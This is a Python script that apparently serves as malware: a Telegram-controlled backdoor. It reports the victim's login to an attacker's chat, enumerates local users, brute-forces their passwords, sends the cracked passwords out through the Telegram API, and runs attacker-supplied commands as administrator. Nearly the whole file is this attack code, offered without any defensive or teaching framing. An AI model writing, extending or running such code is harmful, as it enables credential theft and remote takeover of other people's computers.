import requests
import time
import os
from SpearBruteForce import SpearBruteForce
import subprocess

                
class TelegramBot(object):
    
    def __init__(self,telegram_token,chat_id):
        self.telegram_token = telegram_token
        self.chat_id = chat_id
        
        
    def read_messages(self,offset):
        r = requests.get('https://api.telegram.org/bot'+self.telegram_token+'/getUpdates?offset='+offset)
        con = r.json()['result'][-1]
        offset = con['update_id']
        message = con['message']['text']
        return offset, message

    def readLast(self):
        ffo=1
        off=self.getFirstoffset(self.telegram_token)
        count=0
        while True:
            try:
                off,m=self.read_messages(str(off))
                if off!=ffo:
                    ffo=off
                    if count>=1:
                        return m
                time.sleep(0.5)
            except:
                pass
            count=1

    def getFirstoffset(self):
        r = requests.get('https://api.telegram.org/bot'+self.telegram_token+'/getUpdates?offset=678189729')
        t = str(r.json()).split("{'update_id':")[-1]
        t = t.split()
        t = t[0].replace(',','')
        return t
    
    def send_messages(self,message):
        return requests.get("https://api.telegram.org/bot"+self.telegram_token+"/sendMessage?chat_id="+self.chat_id+"&text="+message)


def shell(teleToken,chatId):
    tl = TelegramBot(teleToken,chatId)
    sp = SpearBruteForce()
    passwords = sp.getPass()
    if len(passwords)>0:
        tl.send_messages(os.getlogin()+" is connected!")
        users = sp.getUsers()
        m = 'all users : \n'
        for i in users:
            m +=i+'\n'
        while True:
            tl.send_messages('(1) to select a user to steal his password\n(2) to display all users\n(3) to brute force all users')
            M = tl.readLast()
            if M == '1':
                if len(passwords)>0:
                    tl.send_messages("Enter a username:")
                    user = tl.readLast()
                    passwd = sp.bruteOnetarget(passwords,user)
                    if passwd:
                        tl.send_messages("The passwords for "+user+" is: "+passwd)
                        tl.send_messages('Please enter command/process to run as admin: ')
                        process = tl.readLast()
                        sp.runProgramasAdmin(user, process, passwd)
                else:
                    tl.send_messages("No passwords were found")
            if M == "2":
                for i in users:
                    m +=i+'\n'
                tl.send_messages(m)
            else:
                tl.send_messages(sp.bruteallusers(passwords,users))


if __name__=="__main__":
    teleToken,chatId = 'Telegram token here', 'Telegram chat id here'
    shell(teleToken,chatId)
                
